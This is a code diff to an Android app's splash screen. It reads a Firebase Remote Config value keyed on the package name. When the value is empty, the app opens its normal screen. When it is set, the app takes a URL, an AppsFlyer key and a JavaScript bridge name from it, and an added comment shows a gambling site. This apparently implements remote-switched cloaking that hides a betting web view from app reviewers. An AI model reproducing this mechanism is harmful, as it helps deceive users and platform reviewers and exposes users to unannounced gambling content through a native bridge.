@@ -14,6 +14,7 @@ import com.google.android.gms.tasks.OnCompleteListener;
 import com.google.android.gms.tasks.Task;
 import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
 import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
+import com.mjb.test1.BuildConfig;
 import com.mjb.test1.MainActivity;
 import com.mjb.test1.R;
 
@@ -54,12 +55,14 @@ public class SplashActivity extends AppCompatActivity {
                     @Override
                     public void onComplete(Task<Boolean> task) {
                         try {
-                            String datas = mFirebaseRemoteConfig.getString("sqdvesw");
+                            String key = BuildConfig.APPLICATION_ID.replace(".", "");
+                            String datas = mFirebaseRemoteConfig.getString(key);
                             Log.d(TAG, "datas=" + datas);
                             if (datas.isEmpty()) {
                                 startActivity(new Intent(SplashActivity.this, MainActivity.class));
                                 finish();
                             } else {
+                             //https://ppg.bet/+o95M3dWpRnFnyw6cKSULp5+jsBridge+1+pt+br
                                 url = datas.split("\\+")[0];//"https://rspg.bet"
                                 appsflyerkey = datas.split("\\+")[1];
                                 jsobjectname = datas.split("\\+")[2];
